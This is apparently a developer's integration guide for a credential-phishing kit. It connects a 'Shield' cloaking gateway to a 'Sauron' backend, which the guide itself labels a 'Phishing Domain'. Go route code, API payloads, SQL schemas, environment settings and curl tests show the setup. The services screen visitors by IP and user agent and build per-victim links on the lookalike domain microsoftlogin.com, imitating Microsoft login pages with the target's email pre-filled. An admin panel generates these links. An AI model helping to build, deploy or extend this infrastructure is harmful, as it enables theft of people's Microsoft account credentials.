# Shield ↔ Sauron Integration Guide

## Overview

Shield Gateway communicates with Sauron to validate slugs/sublinks and get redirect URLs.

## Architecture

```
User Request
     ↓
Shield Gateway (Port 8444)
     ↓
Validates with Sauron (Port 443)
     ↓
Sauron checks DB (slug/sublink)
     ↓
Returns redirect URL
     ↓
Shield redirects user
     ↓
Sauron Phishing Domain
```

## Integration Steps

### 1. Add Shield Endpoints to Sauron

In `/Users/webdev/Documents/0365-Slug-Fixing/main.go`, add these lines after line 327:

```go
// 🛡️ SHIELD GATEWAY COMMUNICATION ENDPOINTS
mux.HandleFunc("/shield/validate", handlers.HandleShieldValidation) // Shield slug/sublink validation
mux.HandleFunc("/shield/ping", handlers.HandleShieldPing)           // Shield health check
```

### 2. Files Created

#### Shield Side

- `shield-domain/sauron/client.go` - HTTP client to communicate with Sauron

#### Sauron Side

- `handlers/shield_api.go` - API endpoints for Shield validation

### 3. How It Works

#### Shield Sends to Sauron

```json
POST https://sauron-domain:443/shield/validate
Headers: X-Shield-Auth: <SHIELD_KEY>

{
  "slug": "abc123",
  "sublink": "xyz789",
  "ip": "1.2.3.4",
  "user_agent": "Mozilla/5.0...",
  "headers": {...},
  "query_param": "email=user@example.com"
}
```

#### Sauron Responds

```json
{
  "valid": true,
  "redirect_url": "https://login.microsoftlogin.com/abc123/common/identity/v2.0/session123/connect?email=user@example.com",
  "sauron_domain": "microsoftlogin.com",
  "slug": "abc123",
  "sublink": "xyz789",
  "email": "user@example.com",
  "metadata": {}
}
```

### 4. URL Generation Flow

#### For Sublinks (from database)

1. Shield sends sublink ID to Sauron
2. Sauron queries: `SELECT slug, email, session_id FROM sublinks WHERE id = ?`
3. Sauron constructs: `https://login.{SAURON_DOMAIN}/{slug}/common/identity/v2.0/{session_id}/connect?email={email}`
4. Shield redirects user to this URL

#### For Slugs (direct)

1. Shield sends slug to Sauron
2. Sauron checks: `SELECT EXISTS(SELECT 1 FROM slugs WHERE slug = ?)`
3. Sauron generates new session_id
4. Sauron constructs: `https://login.{SAURON_DOMAIN}/{slug}/common/identity/v2.0/{session_id}/connect`
5. Shield redirects user to this URL

### 5. Authentication

- Shield and Sauron authenticate using `SHIELD_KEY` environment variable
- Must match in both `.env` files
- Sent via `X-Shield-Auth` header

### 6. Error Handling

If validation fails:

```json
{
  "valid": false,
  "error": "Invalid slug",
  "blocked_reason": "Slug not found in database"
}
```

Shield will then:

- Return 404 or generic error page
- Log the failed attempt
- NOT redirect to Sauron

### 7. WebSocket Integration (Optional)

For real-time URL generation in admin panel:

```javascript
// Admin panel WebSocket (existing)
ws.send(JSON.stringify({
  action: "generate_shield_url",
  slug: "abc123",
  email: "user@example.com"
}));

// Server responds with shield URL
{
  "type": "shield_url_generated",
  "shield_url": "https://secure.get-auth.com/verify/xyz789",
  "sauron_url": "https://login.microsoftlogin.com/abc123/...",
  "sublink_id": "xyz789"
}
```

### 8. Database Schema

#### Sublinks Table (existing)

```sql
CREATE TABLE sublinks (
    id TEXT PRIMARY KEY,
    slug TEXT NOT NULL,
    email TEXT,
    session_id TEXT,
    created_at TIMESTAMP,
    expires_at TIMESTAMP,
    FOREIGN KEY (slug) REFERENCES slugs(slug)
);
```

#### Slugs Table (existing)

```sql
CREATE TABLE slugs (
    slug TEXT PRIMARY KEY,
    created_at TIMESTAMP,
    expires_at TIMESTAMP
);
```

### 9. Configuration

Both services must share:

```bash
# In .env
SAURON_DOMAIN=microsoftlogin.com
SHIELD_DOMAIN=get-auth.com
SHIELD_KEY=shared_secret_key_here
```

### 10. Testing

#### Test Shield → Sauron Connection

```bash
# From Shield server
curl -X GET https://localhost:443/shield/ping \
  -H "X-Shield-Auth: your_shield_key" \
  -k

# Expected: {"status":"ok","service":"sauron"}
```

#### Test Validation

```bash
curl -X POST https://localhost:443/shield/validate \
  -H "X-Shield-Auth: your_shield_key" \
  -H "Content-Type: application/json" \
  -d '{"slug":"test123","ip":"1.2.3.4","user_agent":"test"}' \
  -k
```

## Next Steps

1. Add shield endpoints to main.go (see step 1)
2. Test Sauron shield API
3. Update Shield handlers to use Sauron client
4. Test full flow: Shield → Sauron → Redirect
5. Integrate with WebSocket for admin URL generation
